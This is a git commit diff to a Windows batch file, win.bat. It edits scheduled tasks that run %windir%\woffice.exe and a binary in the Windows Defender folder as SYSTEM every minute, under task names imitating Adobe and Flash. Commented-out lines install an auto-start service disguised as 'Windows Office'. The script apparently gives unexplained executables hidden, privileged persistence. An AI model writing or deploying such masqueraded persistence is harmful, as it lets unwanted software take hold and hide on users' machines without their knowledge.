783a8168d106533f55622bc3bd546335e7f1d3f2
pistacchietto <pistacchietto2@gmail.com>
2018-06-16 04:07:59 +0200

    ok

--- win.bat
+++ win.bat
@@ -8,6 +8,6 @@ rem taskkill /f /im wup.exe
 rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
 rem sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
 rem net start wup
-schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe /rl highest /F
+schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 3 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
